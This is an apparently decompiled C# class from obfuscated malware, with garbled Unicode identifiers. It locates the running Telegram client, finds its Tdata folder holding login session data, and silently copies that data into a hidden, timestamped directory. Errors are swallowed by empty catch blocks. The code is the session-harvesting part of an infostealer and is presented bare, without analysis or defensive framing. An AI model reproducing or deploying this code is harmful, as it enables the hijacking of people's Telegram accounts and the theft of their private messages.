using System;
using System.Diagnostics;
using System.IO;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x0200007B RID: 123
	public class Class_96
	{
		// Token: 0x06000225 RID: 549 RVA: 0x00011F40 File Offset: 0x00010140
		public static void vmethod_265()
		{
			Process[] processesByName = Process.GetProcessesByName("Telegram");
			if (processesByName.Length < 1)
			{
				return;
			}
			ProcessModule mainModule = processesByName[0].MainModule;
			Class_96.field_1 = Path.GetDirectoryName((mainModule != null) ? mainModule.FileName : null) + "\\Tdata";
			Class_96.field_2 = Class_47.\u035A\u030C\u036Bc\u0326\u0020\u031D\u0331\u035E\u0020\u0020\u030D\u0020\u0368\u034Dtgxjqsczmshvyescj\u0367\u0339\u0309\u0310\u0349\u0309\u035D\u0020\u0020\u0333\u0E47t\u0326\u0355\u033C\u0339qftvsdyuclitenhm + "\\Te_" + ((int)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalSeconds).ToString();
			Class_96.dmethod_266(Class_96.field_1, Class_96.field_2);
			Class_96.field_2 = null;
			Class_96.field_1 = null;
			GC.Collect();
			Class_96.field_0++;
		}

		// Token: 0x06000226 RID: 550 RVA: 0x00012008 File Offset: 0x00010208
		public static void dmethod_266(string str_0, string str_1)
		{
			Directory.CreateDirectory(str_1).Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
			string[] array = Directory.GetFiles(str_0);
			for (int i = 0; i < array.Length; i++)
			{
				Class_96.kmethod_267(array[i], str_1);
			}
			array = Directory.GetDirectories(str_0);
			for (int i = 0; i < array.Length; i++)
			{
				Class_96.lmethod_268(array[i], str_1);
			}
		}

		// Token: 0x06000227 RID: 551 RVA: 0x00012078 File Offset: 0x00010278
		private static void kmethod_267(string str_0, string str_1)
		{
			try
			{
				string fileName = Path.GetFileName(str_0);
				if (!Class_96.field_3 || fileName[0] == 'm' || fileName[1] == 'a' || fileName[2] == 'p')
				{
					string destFileName = str_1 + "\\" + fileName;
					File.Copy(str_0, destFileName);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000228 RID: 552 RVA: 0x00012100 File Offset: 0x00010300
		private static void lmethod_268(string str_0, string str_1)
		{
			try
			{
				Class_96.field_3 = true;
				Class_96.dmethod_266(str_0, str_1 + "\\" + Path.GetFileName(str_0));
				Class_96.field_3 = false;
			}
			catch
			{
			}
		}

		// Token: 0x04000176 RID: 374
		public static int field_0;

		// Token: 0x04000177 RID: 375
		public static string field_1;

		// Token: 0x04000178 RID: 376
		public static string field_2;

		// Token: 0x04000179 RID: 377
		private static bool field_3;
	}
}
